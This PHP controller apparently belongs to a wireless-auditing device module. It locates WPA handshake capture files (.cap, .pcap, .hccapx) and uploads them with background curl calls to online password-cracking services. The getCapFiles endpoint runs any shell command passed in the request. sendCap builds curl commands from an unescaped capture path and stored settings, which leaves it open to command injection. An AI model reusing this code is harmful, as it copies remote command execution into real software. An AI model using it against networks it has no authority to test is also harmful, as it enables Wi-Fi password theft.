<?php

namespace frieren\modules\wpaonlinecrack;

class WpaonlinecrackController extends \frieren\core\Controller
{
    protected $endpointRoutes = [
        'checkModuleDependencies',
        'installModuleDependencies',
        'getDependencyInstallationStatus',
        'getSettings',
        'setSettings',
        'getCapFiles',
        'sendCap',
    ];

    public function getSettings()
    {
        $config = self::getConfig();

        return self::setSuccess([
            'wpaSecKey' => $config['wpaSecKey'] ?? '',
            'onlinehashcrackEmail' => $config['onlinehashcrackEmail'] ?? '',
        ]);
    }

    public function setSettings()
    {
        self::setConfig([
            'wpaSecKey' => $this->request['wpaSecKey'],
            'onlinehashcrackEmail' => $this->request['onlinehashcrackEmail'],
        ]);

        return self::setSuccess();
    }

    public function getCapFiles()
    {
        $modulesFolder = \DeviceConfig::MODULE_ROOT_FOLDER;
        $commandDefault = "find -L {$modulesFolder} -type f -name \"*.**cap\" -o -name \"*.**pcap\" -o -name \"*.**pcapng\" -o -name \"*.**hccapx\" 2>&1";
        $command = $this->request['command'] ?? $commandDefault;

        return self::setSuccess([
            'files' => self::setupCoreHelper()::exec($command, false),
            'command' => $command,
        ]);
    }

    public function sendCap()
    {
        $capture = $this->request['capture'] ?? false;
        if (empty($capture)) {
            return self::setError('No capture provided');
        }

        $config = self::getConfig();
        $wpaSecKey = $config['wpaSecKey'] ?? false;
        $onlinehashcrackEmail = $config['onlinehashcrackEmail'] ?? false;
        if (empty($wpaSecKey) && empty($onlinehashcrackEmail)) {
            return self::setError('Configuration incomplete');
        }

        if ($wpaSecKey) {
            self::setupCoreHelper()::execBackground("curl -X POST -F \"webfile=@{$capture}\" --cookie key={$wpaSecKey} https://wpa-sec.stanev.org/?submit");
        }

        if ($onlinehashcrackEmail) {
            self::setupCoreHelper()::execBackground("curl -X POST -F \"email={$onlinehashcrackEmail}\" -F \"file=@{$capture}\" https://api.onlinehashcrack.com");
        }

        return self::setSuccess();
    }
}
